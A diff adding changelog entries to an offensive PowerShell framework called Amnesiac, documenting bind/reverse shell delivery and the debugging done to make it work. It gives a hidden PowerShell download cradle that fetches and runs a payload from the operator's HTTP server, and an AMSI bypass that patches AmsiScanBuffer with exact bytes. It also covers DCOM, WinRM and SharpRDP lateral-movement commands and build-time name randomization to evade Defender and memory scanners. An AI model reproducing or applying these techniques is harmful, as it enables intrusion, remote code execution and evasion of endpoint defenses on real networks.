@@ -5,6 +5,592 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-06-03a] fix(ux): full command substitutes download cradle when payload exceeds cmd.exe limit
+
+The stealth bind shell `[2] Full command` option was silently broken for cmd.exe delivery.
+`Get-PayloadLauncher` base64-encodes the InlinePS script in UTF-16LE producing a
+`powershell.exe -nop -ep bypass -w hidden -enc <b64>` string that is ~10–13k chars for a typical
+stealth payload. cmd.exe silently truncates command lines at 8191 chars, so the payload would
+arrive broken with no error message.
+
+**Fix — bind shell stealth path:**
+After computing `$wrapped`, check if `$wrapped.Length -gt 8000`. If so, `[2] Full command`
+displays and copies the download cradle instead of the truncated `-enc` command:
+```
+powershell.exe -nop -ep bypass -w hidden -c "<amsi-bypass>;iex(new-object net.webclient).downloadstring('http://<op-IP>:8080/pipe_XXXX.ps1')"
+```
+The cradle is ~150 chars, well within the limit. The pipe file is always written to disk in the
+stealth bind shell path (same file used by sharprdp/dcom), so the cradle works as long as `serve`
+is running. Label changes from "launcher: ps" to "download cradle (serve required — -enc is
+NNNN chars, exceeds cmd.exe 8191-char limit)" so the operator knows why.
+
+**Fix — reverse shell stealth path:**
+No pipe file is written there so no cradle substitution is possible. Instead, a `[!]` length
+warning is appended to the `[2] Full command` label when the payload exceeds 8000 chars,
+directing the operator to use `[1] Inline PS` if pasting into cmd.exe.
+
+**Changes:**
+- Bind shell stealth block: `$_fullCmdPayload` / `$_fullCmdNote` length-switch logic
+- Reverse shell stealth block: inline length check adds `[!]` warning to label
+- Only `Amnesiac.ps1` — ShellReady.ps1 uses older payload generation without the `[1]/[2]` picker
+
+---
+
+## [2026-06-01a] fix(ux): SessionHunter non-domain usage + _kw hint mechanism
+
+Fixes `SessionHunter` keyword in `Start-LocalShell` for non-domain-joined operators, and adds a
+general `hint` display mechanism to the `_kw` tool-load dispatcher.
+
+**Problem:** From a `runas /netonly` machine, typing `SessionHunter` loaded the module but gave
+no guidance. Calling `Invoke-SessionHunter` with no arguments triggered a `GetDomain` failure
+because `$env:USERDNSDOMAIN` is null on a non-domain-joined machine. The user had to know to pass
+`-Domain`/`-DomainController` explicitly.
+
+**Fix — hint field in `_kw` entries:**
+Added optional `hint` key to the `_kw` hashtable entries in `Start-LocalShell`. After a tool
+loads successfully, if `hint` is set, the strings are printed in Cyan before any auto-invoke.
+`SessionHunter` now shows usage examples immediately on load:
+
+```
+ [*] Non-domain (runas /netonly):  Invoke-SessionHunter -Domain <dom> -DomainController <DC-IP> [-UserName <dom\user> -Password <pass>]
+ [*] Domain-joined:                Invoke-SessionHunter
+ [*] Hunt specific user:           Invoke-SessionHunter -Hunt <user> -Domain <dom> -DomainController <DC-IP>
+ [*] Check admin access:           Invoke-SessionHunter -CheckAsAdmin -Domain <dom> -DomainController <DC-IP>
+```
+
+**GOAD lab finding:** `NetSessionEnum` (used by `Invoke-SessionHunter`) is restricted to local
+administrators on Windows Server 2016+ by default. Standard domain users (e.g. hodor) get empty
+results from all member servers. Querying the DC directly is more permissive. To get useful
+results, gain a session on a machine where you have local admin first, then run `SessionHunter`
+from that session.
+
+**DCOM operational finding:** `dcom` via ShellWindows/ShellBrowserWindow returns `0x80070005`
+(E_ACCESSDENIED at class factory level) when called from a non-domain-joined machine with
+`runas /netonly`, even against targets with active interactive sessions. DCOM activation uses a
+different auth pathway than SMB/WinRM — the remote DCOM service rejects the activation request
+from outside the domain. DCOM delivery is only reliable from a domain-joined operator machine or
+from within an existing pipe session.
+
+**Changes:**
+- `_kw` dispatch loop: prints `$kwDef.hint` lines after `[+] loaded.` message (both files)
+- `SessionHunter` entry in `_kw`: added `hint` array with non-domain and domain-joined examples
+- Both changes applied to `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
+
+---
+
+## [2026-05-31f] feat(delivery): DCOM lateral movement — ShellWindows/ShellBrowserWindow/MMC20
+
+Adds `dcom` command to `Start-LocalShell` in both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.
+Also backfills `winrm` and `winrmscan` into `Amnesiac_ShellReady.ps1` (they were only in the
+coloured version).
+
+**Why DCOM:**
+SMB-based methods (Invoke-SMBRemoting, Invoke-WMIRemoting) require local admin on the target.
+WinRM requires `Remote Management Users` membership. DCOM via ShellWindows/ShellBrowserWindow
+uses the **Access** permission tier (domain users allowed by default) rather than the **Launch**
+tier (admin required) because it connects to `explorer.exe` which is already running — no new
+process is spawned. This makes it viable for low-privilege domain users whenever an interactive
+session exists on the target (common in workstation environments).
+
+**Privilege matrix:**
+
+| Method | Local admin required | Active session required |
+|--------|---------------------|------------------------|
+| ShellWindows (default) | No | Yes |
+| ShellBrowserWindow | No | Yes |
+| MMC20 | Yes | No |
+
+**Delivery mechanism:** Same serve-based download cradle as SharpRDP
+(`$global:LastSharpRDPCradleFile`). Target downloads the inline pipe payload from the operator's
+HTTP server and executes it entirely in memory. Requires `serve` running on the operator machine.
+Target downloads and executes as the logged-on interactive user.
+
+**Usage:**
+```
+dcom computername=10.3.10.22
+dcom computername=10.3.10.22 method=ShellBrowserWindow
+dcom computername=10.3.10.22 method=MMC20
+```
+
+**Changes:**
+- `dcom` handler added to `Start-LocalShell` in `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
+- `winrm` and `winrmscan` ported to `Amnesiac_ShellReady.ps1` (were missing)
+- Help text updated in both files: `dcom` listed in green alongside `winrm`/`winrmscan`
+- Pre-listener delivery hint updated to include `dcom` as option 2
+- Serve-check message updated: "DCOM/SharpRDP last-resort ready"
+- `CLAUDE.md` Key Commands: `dcom` entry added
+- `CLAUDE.md` Bind Shell Flow: delivery priority table expanded to 4 rows
+
+---
+
+## [2026-05-31e] ux(bind-shell): remove SharpRDP clipboard option, WinRM-first delivery hints
+
+Removed `[3] SharpRDP` from the stealth bind shell clipboard picker. The menu now shows only
+`[1] Inline PS` and `[2] Full command`. SharpRDP is reclassified as a last-resort option only,
+accessible via the `sharprdp` local shell command after manually setting up `serve`.
+
+**Rationale:** SharpRDP requires an active, unlocked RDP desktop session on the target.
+This is operationally rare, invasive (disconnects the existing user when SharpRDP
+authenticates), and unreliable (keystroke injection timing issues with long payloads).
+WinRM delivery — added in `[2026-05-31d]` — is clean, requires no active session, no local
+admin, and no serve. It should be the first thing the operator tries.
+
+**Changes:**
+- Stealth bind shell clipboard prompt: `[1]/[2]/[3]` picker → `[1]/[2]` only (`Amnesiac.ps1` + `Amnesiac_ShellReady.ps1`)
+- Pre-listener hint: "SharpRDP cradle selected — type 'serve'" → "Deliver via winrm (preferred)" + "SharpRDP last-resort: run serve first" (`Amnesiac.ps1`)
+- Listener startup serve check: hard RED warning → soft DarkGray note that SharpRDP is last-resort and winrm doesn't need serve (`Amnesiac.ps1`)
+- `sharprdp` no-args help messages: "select [3] SharpRDP" → "generate a stealth bind shell payload first" (both files)
+- `CLAUDE.md` Key Commands: added `winrm`, `winrmscan`, `servelog` entries
+- `CLAUDE.md` Bind Shell Flow: replaced SharpRDP-centric flow with WinRM-first priority table and step-by-step
+
+`Invoke-SharpRDP` remains available in the tool cache and `sharprdp` remains a valid local shell
+command for environments where WinRM is blocked and an active RDP session exists.
+
+---
+
+## [2026-05-31d] feat(delivery): WinRM-based bind shell delivery for low-priv domain users
+
+Adds two new local shell commands:
+
+**`winrm computername=<IP> username=<dom\user> password=<pass>`**
+Primary low-priv delivery path. Tests WinRM access (Test-WSMan with Negotiate auth), then delivers
+the bind shell inline payload directly via `Invoke-Command -AsJob`. No active RDP session required,
+no local admin required, no serve/HTTP server required. Requires the target user to be in the
+`Remote Management Users` group on the target machine. The payload travels encrypted over Kerberos
+(or NTLM) — clean and reliable. Registers the target for the bind shell listener automatically.
+
+**`winrmscan username=<dom\user> password=<pass> [range=10.x.x.1-254]`**
+Scans a range for WinRM-accessible hosts for a given credential. TCP probes port 5985 first
+(silent on closed ports), then tests WSMan auth. Prints accessible hosts in green.
+
+Also adds `$global:LastInlinePS` storage in `Show-PayloadMenu` (bind shell, stealth format) so the
+`winrm` command always has the current session's payload ready without re-entering the menu.
+
+SharpRDP redesignated in help as "requires active session" — winrm/winrmscan now listed as the
+primary low-priv delivery method.
+
+---
+
+## [2026-05-31c] fix(sharprdp): shorten Win+R cradle by removing inline AMSI bypass
+
+The Win+R cradle previously prepended a 128-char AMSI bypass before the `iex(DownloadString(...))`
+call. This made the full command 264 chars. SharpRDP injects keystrokes one at a time; long strings
+are unreliable — timing issues or RDP session reset mid-injection cause ungraceful exit (no
+`Disconnecting from / Connection closed` messages) and a corrupted/missing command on target.
+
+Removed the inline AMSI bypass from the Win+R cradle in both `Amnesiac.ps1` and
+`Amnesiac_ShellReady.ps1`. The command is now ~132 chars. The pipe payload itself disables AMSI
+before executing, so the bypass in the cradle is only needed if AMSI would block the `DownloadString`
+call itself — not a concern in no-AV lab environments. For hardened targets, add the AMSI bypass
+back or use the `[1] Inline PS` clipboard option with manual delivery.
+
+---
+
+## [2026-05-31b] fix(sharprdp): switch local shell sharprdp from exec=cmd to Win+R mode
+
+`sharprdp` in the local shell (Start-LocalShell) was calling `[SharpRDP.Program]::Main` with
+`exec=cmd`, which requires an active CMD.EXE window already open and focused on the target desktop.
+Win+R mode (default, no `exec=cmd`) opens its own Run dialog and is reliable whenever any unlocked
+session exists — confirmed working via TestSharpRDPDirect. Removed `exec=cmd` from both
+`Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`. Updated status message from "Wait 15 seconds for
+output" to a correct description of the flow.
+
+---
+
+## [2026-05-31] fix(bind-shell): pre-auth SMB, auth_fail detection, serve health check, diagnostic rewrite
+
+Three root-cause fixes for the `no_pipe` failure observed after confirmed SharpRDP payload execution:
+
+1. **`net use` pre-auth in `Scan-WaitingTargets`** (`Amnesiac.ps1` + `Amnesiac_ShellReady.ps1`):
+   `NamedPipeClientStream.Connect()` requires an established SMB session before the named pipe
+   tree is accessible. Without `net use \\target\IPC$`, Windows may silently fail auth on the
+   first connect attempt, returning a generic error that `no_pipe` swallowed. Now both files
+   call `net use \\$Computer\IPC$` (no explicit creds — uses the `runas /netonly` token) before
+   the pipe connect. `WaitOne` timeout raised from 3s to 5s to cover the extra round-trip.
+
+2. **`auth_fail` status** (`Amnesiac.ps1`): `no_pipe` previously swallowed both "pipe not found"
+   and "access denied" errors. Now the exception message is inspected: if it contains
+   "denied/logon/credentials/access" the status is `auth_fail` (yellow, with actionable message
+   telling the operator to use `runas /netonly`); otherwise `no_pipe` (DarkGray, pipe not ready).
+
+3. **Serve health check at listener startup** (`Amnesiac.ps1`): When a SharpRDP cradle was
+   generated, the listener now checks whether `$global:FileServerProcess` is alive before showing
+   "Listening for sessions". If serve is NOT running, a red warning is shown immediately — the
+   most common cause of `no_pipe` is the target failing to download the pipe payload because the
+   operator forgot to run `serve` first.
+
+4. **`DiagnoseExecChain.ps1` rewrite** (`Tests/`): Previous version verified results via UNC
+   path reads (`\\target\C$\...`) which fail with non-admin credentials (hodor is non-elevated).
+   Rewritten to use HTTP callbacks (HTTP listener on operator, like `SweepSharpRDP.ps1`) and
+   `exec=cmd` mode (matching actual delivery). Three stages: AMSI+beacon, serve download+beacon,
+   inline pipe connect. Targets 10.3.10.22 by default (confirmed HTTP callback in sweep test).
+
+5. **`TestInlinePipe.ps1` update** (`Tests/`): Now uses `exec=cmd` and explicit `net use` auth
+   (matching actual bind shell delivery), targets 10.3.10.22 by default.
+
+Why: SweepSharpRDP.ps1 showed 10.3.10.22 produces HTTP callbacks via exec=cmd. The bind shell
+test failed with `no_pipe` after confirmed execution — indicating the pipe server either never
+started (serve not running / download failed) or the operator couldn't connect to it (SMB auth).
+These changes give both better diagnostics and fix the SMB auth gap.
+
+---
+
+## [2026-05-31] feat(evasion): build-time name randomization for AmnesiacLoader assembly
+
+`AmnesiacLoader\Build.ps1` now randomizes the namespace, all public class names (Stomper, Injector,
+NativeLoader), all public method names (ConcealLoadedAssembly, InjectUnmanagedPS, SpawnUnmanagedPS,
+Load), and all internal class/method names (SleepMask, Bypass, CallStack, SyscallResolver, UnmanagedPS,
+etc.) at compile time using word-boundary regex substitution on temp source copies.
+
+Why: static strings like "AmnesiacLoader", "Stomper", "ConcealLoadedAssembly" appear in three high-signal
+detection surfaces:
+  1. Named pipe commands sent to the target (pipe content scanning by endpoint agents)
+  2. ETW AssemblyLoad events (CLR ETW logs the assembly name on every Load() call)
+  3. CLR heap metadata (memory scanners find type/method name strings)
+With randomization, each build produces a unique namespace + class + method name set. No signature can
+match static strings; matching would require behavioral analysis of the reflection call pattern itself.
+
+The compiled DLL is named `$_alNs.dll` (the random namespace string). A PS-side name map block
+(`# !!AL-MAP-BEGIN!! ... # !!AL-MAP-END!!`) is written to `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
+containing `$_alNs`, `$_alStp`, `$_alConc`, etc. All pipe commands that call loader methods now use
+PS reflection (`$_la.GetType(...).GetMethod(...).Invoke(...)`) with the map variables interpolated at
+send time -- the target receives only the random literal names, never "AmnesiacLoader" or "Stomper".
+
+Affected: `AmnesiacLoader\Build.ps1` (rewrite), `Amnesiac.ps1` header + 5 invocation sites,
+`Amnesiac_ShellReady.ps1` header + 3 invocation sites.
+
+---
+
+## [2026-05-31] fix(launcher): revert ps launcher to -enc; -c triggers Defender AMSI at process creation
+
+`Get-PayloadLauncher` `ps` case was changed to `-c "..."` in a previous fix, but that broke the full
+command (option 2) against targets with Windows Defender enabled.
+
+Root cause: `-c "<plaintext_script>"` puts the AMSI bypass code (`[Ref].Assembly.GetType + GetField +
+SetValue`) in plaintext in the process command line. Defender scans the command-line argument before
+any user code runs — the bypass never has a chance to disable AMSI — and returns Access Denied.
+
+With `-enc <base64>`, the command line shows only an opaque base64 blob; Defender cannot pattern-match
+the bypass at process creation time. The bypass runs as the first thing in the script and disables AMSI
+before the inner script is scanned.
+
+The stealth payload InlinePS is ~2400 chars → ~6400 chars as -enc Unicode base64 — well within cmd.exe's
+8191-char paste limit. The size concern that motivated the -c change was wrong.
+
+Fix: generate `powershell.exe -nop -ep bypass -w hidden -enc <b64>` (Unicode base64 of InlinePS).
+
+Side effect: the Full Command is now also useful as the "built-in" delivery format for remote execution
+scenarios (e.g., delivered via WMI, PsExec, or pasted directly into a cmd.exe RDP session) without
+needing to first open a separate `powershell -ep bypass` window.
+
+Affected: `Get-PayloadLauncher` `ps` case in `Amnesiac.ps1`.
+
+---
+
+## [2026-05-31] fix(session): EndMarker inaccessible in child runspace — session interaction always timed out
+
+`InteractWithPipeSession` creates isolated `[runspacefactory]::CreateRunspace()` runspaces for two
+async read operations: "get prompt" (send `prompt | Out-String`, read until EndMarker) and "read
+command response." Both scriptblocks referenced `$global:EndMarker` directly. In PowerShell 5.x,
+child runspaces created with `CreateRunspace()` have their own isolated global scope — user-defined
+globals from the calling runspace are NOT inherited. So `$global:EndMarker` was always `$null` inside
+the scriptblocks, the EndMarker comparison never matched, the read loops ran indefinitely, and every
+`WaitOne(5000)` call timed out with `[-] The operation timed out`.
+
+Fix: capture `$_em = $global:EndMarker` once before the outer while loop, then pass `$_em` as an
+explicit `AddArgument` to each scriptblock (added `$endMarker` parameter to both). The comparison
+inside each scriptblock now uses the passed-in parameter instead of `$global:`.
+
+Both async scriptblocks in `InteractWithPipeSession` are fixed (lines ~3160 and ~4990).
+
+---
+
+## [2026-05-31] fix(ux): listener auto-enters session on single-target callback; Ctrl+C protected
+
+`Print-MultiListener` probe loop had two UX issues after a session was received:
+1. The loop continued indefinitely after `[+] Session received` — the user had no way to interact
+   with the session without pressing Q, returning to the main menu, and selecting it manually.
+2. Pressing Ctrl+C raised `PipelineStoppedException` unhandled, terminating the entire Amnesiac
+   process — any sessions collected were lost and the operator had to restart.
+
+Fix: the probe loop is now wrapped in `try/catch [PipelineStoppedException]` so Ctrl+C gracefully
+exits the listener and returns to the menu. Additionally, when exactly one target was configured
+(the typical Scenario 1 bind-shell flow) and a session arrives, the loop auto-breaks and calls
+`InteractWithPipeSession` directly — no Q-press, no menu navigation required. Multi-target global
+listener mode (multiple IPs in target list) continues collecting as before; operator presses Q when
+done and sessions are accessible from the main menu.
+
+Affected: `Print-MultiListener` probe loop in `Amnesiac.ps1`.
+
+---
+
+## [2026-05-31] fix(amsi-stealth): stealth payload outer bypass replaced with GetProcAddress AmsiScanBuffer patch
+
+The stealth payload (format `[3]`) was blocked by Windows Defender at parse time with
+`ScriptContainedMaliciousContent` / `ParserError`. Root cause: the outer decompressor stub in both
+`New-PayloadScript` and `New-StealthScript` hardcoded the `amsiInitFailed` reflection approach
+(`[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")` + `GetFields(NonPublic,Static)` +
+setting bool fields to `$true`). This is a well-known Defender static signature — the char-array
+encoding was not sufficient to evade it.
+
+Fix: `Get-AmsiBypassSnippet -Technique 'pageguard'` now generates a real PS-level bypass using Win32
+P/Invoke via `Add-Type`: `GetModuleHandle("amsi.dll")` → `GetProcAddress("AmsiScanBuffer")` →
+`VirtualProtect(RWX)` → `Marshal.Copy([byte[]](0x48,0x31,0xC0,0xC3))` (xor rax,rax; ret) → restore
+old protection. Both string arguments are char-array encoded at generation time to avoid literal
+`amsi.dll` / `AmsiScanBuffer` in the payload. The C# type definition uses a random 8-char class name
+and single-quoted `Add-Type -Td` so the DllImport double-quotes don't require escaping. No reflection
+on AmsiUtils, no field name strings — eliminates all known Defender signatures for this technique.
+
+Both `$decomp` stubs now use `+` concatenation (not string interpolation) to embed the bypass, which
+prevents the `$` characters in the bypass snippet from being re-interpolated into the decompressor string.
+The `default` case in `Get-AmsiBypassSnippet` also updated from `fail` → `pageguard`.
+
+Affected: `Get-AmsiBypassSnippet` (pageguard/hwbp/default cases), `New-PayloadScript` ($decomp),
+`New-StealthScript` ($decomp). Synced to `Amnesiac_ShellReady.ps1`.
+
+---
+
+## [2026-05-31] fix(token-detection): Test-NetworkLogonToken now correctly identifies runas /netonly sessions
+
+`Test-NetworkLogonToken` previously checked only `[WindowsIdentity]::GetCurrent()`, which always returns
+the local primary token in a `runas /netonly` process — even though all network access (SMB, LDAP) uses
+the domain credentials stored in the LSA session cache. The function returned `$false` and the startup
+banner showed "(no network logon token)" even when domain credentials were fully active.
+
+Fix: added a second check using `LsaEnumerateLogonSessions` / `LsaGetLogonSessionData` (P/Invoke via
+inline `Add-Type`) to scan the LSA logon session table for a Type-9 NewCredentials entry. LogonType 9
+is the marker Windows creates for every `runas /netonly` process. The struct offsets (x64):
+`SECURITY_LOGON_SESSION_DATA.LogonType` at offset 64, `UserName` (LSA_UNICODE_STRING) at offset 16,
+`LogonDomain` at offset 32 — verified against the Windows SDK layout with natural alignment.
+
+The function now returns the identity name string (not a boolean), so callers no longer need a second
+`GetCurrent().Name` call. `Show-OpsecBanner` and the `engagement nondomained` handler updated accordingly.
+Banner now shows `NORTH\hodor (runas /netonly)` instead of `(no network logon token)`.
+
+Applied to both Amnesiac.ps1 and Amnesiac_ShellReady.ps1.
+
+---
+
+## [2026-05-26] fix(sharprdp): arguments= field unrecognized; use download cradle via direct Main() call
+
+Root cause (confirmed via IL analysis of embedded SharpRDP binary): SharpRDP's `Program.Main` only
+reads the `command=` field — the `arguments=` key is silently ignored. The old format
+`command=powershell.exe arguments=-ep,bypass,-Window,Hidden,-enc,<b64>` caused SharpRDP to type
+only `powershell.exe` into the Win+R dialog with no arguments, opening a bare PS window that never
+ran the pipe server.
+
+Additionally, `RunRun` calls `this.cmd.ToLower()` before keyboard injection, which would corrupt any
+base64 payload passed via `command=` (uppercase A-Z become lowercase).
+
+Fix: the local shell `sharprdp` handler now:
+1. Loads the SharpRDP assembly from the gzip+b64 blob in the tool cache source directly (bypasses
+   `Invoke-SharpRDP`'s `Command.Split(" ")` which breaks command values containing spaces)
+2. Calls `[SharpRDP.Program]::Main()` with a properly-split args array where `command=` contains
+   the full download cradle: `powershell -nop -ep bypass -w hidden -c "iex(new-object net.webclient)
+   .downloadstring('http://IP:8080/pipe_NAME.ps1')"` — entirely lowercase, unaffected by ToLower()
+3. Ignores `command=` and `arguments=` from user input, rebuilding command from `$global:LastSharpRDPCradleFile`
+
+The bind shell stealth builder and `$global:LastSharpRDPB64` storage also updated to use the
+all-lowercase cradle format. Changes in both Amnesiac.ps1 and Amnesiac_ShellReady.ps1.
+
+---
+
+## [2026-05-26] fix(sharprdp): remove cmd /c start /b wrapper; add firewall rule on serve start
+
+`command=cmd.exe arguments=/c,start,/b,powershell.exe,...` replaced with `command=powershell.exe arguments=-ep,bypass,...`
+in all three locations (Get-PayloadLauncher, bind-shell stealth builder, SharpRDP template display) and in
+Amnesiac_ShellReady.ps1 equivalents. `cmd /c start /b` is unnecessary — RDP session disconnect preserves
+processes on the target — and was a likely failure point: if the intermediate cmd.exe exited before
+powershell.exe fully started, the child may have been killed with it.
+
+Both serve handlers (main menu and local shell, in both files) now run:
+  `New-NetFirewallRule -Name "AmnesiacServe<port>" ... -Direction Inbound -Protocol TCP -LocalPort <port>`
+immediately after `Start-Process`. Windows Firewall on the operator machine was blocking inbound port 8080,
+so the target's download cradle silently timed out and no pipe server was ever started.
+
+---
+
+## [2026-05-26] feat(local-shell): add 'serve' command so HTTP server can be started before SharpRDP
+
+Added `serve` as a local shell command mirroring the main-menu `Serve` handler. This closes
+the UX gap where the user selects [3] SharpRDP (download cradle), presses [D] to enter the
+local shell, and then has no way to start the operator HTTP server — causing the target's
+download cradle to fail silently. Now the correct sequence is: local shell → `serve` → SharpRDP
+no-args (to see template + refresh clipboard) → SharpRDP with real credentials.
+Also added a `[!] type 'serve'` reminder at the [D]/[Enter] prompt when a cradle payload was
+generated, and a `serve` entry in the local shell `help` output.
+
+---
+
+## [2026-05-26] fix(sharprdp): use download cradle to bypass cmd.exe 8191-char keyboard injection limit
+
+Root cause of no_pipe: SharpRDP injects keystrokes into the RDP session. The full Unicode base64
+of InlinePS is ~10,000 chars — exceeds cmd.exe's 8191-char keyboard input buffer. The b64 was
+silently truncated, PowerShell received invalid base64 and exited immediately, pipe server never
+started. Fix: when operator selects [3] SharpRDP, InlinePS is written to operator disk as
+`pipe_<pipename>.ps1` (no target disk write), and the clipboard b64 encodes a short download
+cradle (`iex(New-Object Net.WebClient).DownloadString('http://<IP>:8080/pipe_<PN>.ps1')`) which
+is ~120 chars of b64 — well within the 8191-char limit. Target downloads InlinePS from operator's
+`serve` (HTTP server), AMSI bypass in InlinePS fires, pipe server starts. Requires `serve` running
+before SharpRDP delivery; a warning is displayed.
+
+---
+
+## [2026-05-26] ux(sharprdp): clipboard copies only b64; SharpRDP no-args shows full command template
+
+When the operator selects `[3] SharpRDP` from the bind shell stealth menu, the clipboard now
+receives **only the base64 payload** (not the full command string with placeholder variables).
+The b64 is stored in `$global:LastSharpRDPB64`. When the operator types `SharpRDP` with no
+arguments in the local shell, the display now shows the exact detached-delivery command:
+`SharpRDP computername=<IP> username=<domain>\<user> password=<pass> command=cmd.exe arguments=/c,start,/b,powershell.exe,-ep,bypass,-Window,Hidden,-enc,<b64>` — substituting the
+actual stored b64 if one was generated this session. This prevents the user from having to
+navigate back through a long b64 string in the clipboard editor to fill in placeholders, and
+makes `command=cmd.exe` explicit so the `cmd /c start /b` detach pattern is used correctly.
+
+---
+
+## [2026-05-26] feat(sharprdp): detached SharpRDP launcher option for bind shell delivery
+
+Added `sharprdp` launcher to `Get-PayloadLauncher`. When the user selects stealth bind shell and
+presses `[3] SharpRDP`, the generated command wraps the PS payload in
+`cmd.exe /c start /b powershell.exe -ep bypass -Window Hidden -enc <b64>`. The `start /b` detaches
+the PS process from cmd.exe's process group, so it survives when SharpRDP disconnects the RDP
+session. Without this, the spawned powershell.exe can die when the RDP session job terminates on
+disconnect, explaining why `Scan-WaitingTargets` found `no_pipe` after 43+ probes despite
+`[+] Executing powershell.exe` appearing in SharpRDP output.
+
+---
+
+## [2026-05-26] fix(local-shell): Invoke-Expression "$cmd 2>&1" breaks try/catch blocks
+
+`Start-LocalShell` ran all commands via `Invoke-Expression "$cmd 2>&1"`. For try/catch blocks,
+PowerShell parses `2>&1` as a new token after the statement and throws "The term '2>&1' is not
+recognized". This silently swallowed the result of probe commands like the named-pipe existence
+check, making diagnostics impossible. Fixed by using `& ([scriptblock]::Create($cmd)) 2>&1` which
+correctly applies the stderr redirect to the scriptblock's output stream.
+
+---
+
+## [2026-05-26] feat(sharprdp): auto-register delivery target as bind shell listener target
+
+When SharpRDP is used to deliver a bind shell payload via `[D] Open local shell`, the
+`computername=` value in the SharpRDP command is automatically parsed and added to
+`$global:AllUserDefinedTargets`. After typing `back`, the bind shell listener skips the target
+prompt and begins scanning immediately — no need to type the target IP twice.
+
+---
+
+## [2026-05-26] fix(bind-shell): early warning when Amnesiac launched without -NoDomain/-Detached
+
+Without `-NoDomain`, `$global:Detach` is false and `Print-MultiListener` embeds the operator's
+LOCAL SID in the pipe ACL instead of `S-1-1-0` (Everyone). The resulting payload always fails
+for remote targets — the operator's local SID is not a valid network identity, so castleblack
+rejects the `NamedPipeClientStream.Connect()` even though the pipe server is running fine.
+
+Previously a warning existed but only fired when no target list was configured. If `$global:AllUserDefinedTargets` was pre-populated from a prior session, the prompt (and warning) were skipped entirely.
+
+Fix: warning now fires at the TOP of `Print-MultiListener` unconditionally when `!$global:Detach`,
+before the payload is generated — so the operator sees it and can restart before wasting a delivery.
+
+**Always launch for remote bind shells:**
+```
+runas /netonly /user:DOMAIN\user powershell.exe
+. .\Amnesiac.ps1; Amnesiac -NoDomain -IP <your-IP>
+```
+
+---
+
+## [2026-05-26] feat(listener): live per-probe status in bind shell listener
+
+The multi-listener loop was completely silent during polling — `Scan-WaitingTargets` returned
+`$null` on every failed connection attempt with no visible output. Operators had no way to tell
+whether the pipe server was being scanned, whether payloads had run on targets, or whether to
+keep waiting.
+
+Changes in `Amnesiac.ps1`:
+- `Scan-WaitingTargets` runspace now returns a status object on failure (`{Status='no_pipe'}` or
+  `{Status='error'}`) instead of `$null`; connected results gain `Status='connected'`
+- Session detection changed from `if ($result)` to `if ($result -and $result.PipeClient)` so
+  diagnostic objects don't accidentally land in `MultipleSessions`
+- Failed and stalled runspaces populate `$global:BindScanStatus` keyed by target IP
+- Listener loop shows a `\r`-overwriting status line per probe cycle:
+  `[~] #N  10.3.10.22:no_pipe` — one line, updates in place
+- On session arrival or Q-stop, a blank `Write-Host ""` advances past the `\r` line cleanly
+
+Operational value: immediately distinguishes "payload not running yet" (sustained `no_pipe`) from
+"AMSI killed payload" (same, but even after 60s) vs. "session established".
+
+---
+
+## [2026-05-26] fix(listener): Q at target prompt exits Amnesiac instead of cancelling listener
+
+Typing `q` at the "Enter bind shell target(s)" `Read-Host` prompt stored the literal string
+`'q'` as a target hostname. The listener loop then started scanning for a pipe named after the
+target `'q'` (which never exists), and the only way to stop was Ctrl+C — which, with
+`TreatControlCAsInput = $false`, sends a termination signal and kills the entire Amnesiac
+process (including any active sessions).
+
+Fix in `Amnesiac.ps1`:
+- Prompt updated to show "(or Q to cancel)" hint
+- `if ($_tIn -ieq 'q' -or $_tIn -ieq 'quit') { return }` check added immediately after `Read-Host`
+- Second `$Host.UI.RawUI.KeyAvailable` Q-check added after `Scan-WaitingTargets` returns, so a
+  keypress during the scan is caught without waiting for the next 500ms sleep cycle
+- `Write-Host " [*] Listener stopped."` shown when Q breaks the loop
+
+Applied to `Amnesiac.ps1` only — ShellReady uses a timed scan loop without interactive Q.
+
+---
+
+## [2026-05-26] fix(param): -NoDomain alias not recognised — bind shell generated with local SID
+
+The `-Detached` parameter had only `[Alias('NonDomain')]`. The docs and operator muscle
+memory both use `-NoDomain`, which PowerShell silently ignored (no error on unknown switch
+when not using CmdletBinding strict mode). Result: `$global:Detach` stayed `$false`, bind
+shell payloads were generated with the operator's local SID instead of `S-1-1-0`, and the
+named pipe on the target rejected any incoming connection from the domain-credentialed
+operator — no session despite successful payload delivery via winrs.
+
+Fix: added `NoDomain` and `Detach` as additional aliases so all common forms work:
+  `-NoDomain`, `-NonDomain`, `-Detached`, `-Detach`
+
+Applied to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.
+
+---
+
+## [2026-05-26] fix(listener): Scan-WaitingTargets EndInvoke hang — add 3s wall-clock guard
+
+`Scan-WaitingTargets` collects runspace results with `EndInvoke`, which blocks until the
+runspace completes. Each runspace tries `NamedPipeClientStream.Connect(500)`, but the 500ms
+timeout only covers waiting for the pipe to become available after the SMB session is open.
+SMB session establishment itself (Kerberos/NTLM auth) is below the pipe API and can stall
+indefinitely — making `EndInvoke` block until the TCP stack times out (~20s), rendering the
+Q-to-stop keypress check dead.
+
+Fix: `AsyncWaitHandle.WaitOne(3000)` guard around each `EndInvoke`. Runspaces that don't
+complete within 3s are `Stop()`-ed and disposed. The outer Q-check loop now regains control
+within 3s maximum per scan cycle regardless of SMB auth stalls.
+
+Applied to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.
+
+---
+
+## [2026-05-26] fix(ux): bind shell delivery prompt — drop into local shell before listener starts
+
+Operational gap: when using the bind shell flow from a non-domain-joined operator box, the
+natural delivery method is option 5 local shell → `Invoke-SMBRemoting`. But the listener
+started immediately after payload copy, leaving no way back into the local shell.
+
+Fix: after copying the payload to clipboard, `Print-MultiListener` now shows:
+```
+ [D] Open local shell to deliver payload (returns here to start listener)
+ [Enter] Start listener now
+```
+Pressing `D` opens `Start-LocalShell`. When the operator types `back`, they return to the
+bind shell flow and the listener starts normally. Only shown in interactive mode (not when
+called with `-NoWait`, which is used by auto-delivery/scan flows).
+
+---
+
 ## [2026-05-26] feat(runbin): reflective .NET assembly loading — RunBin command
 
 ### New command: `RunBin <name> [args]`
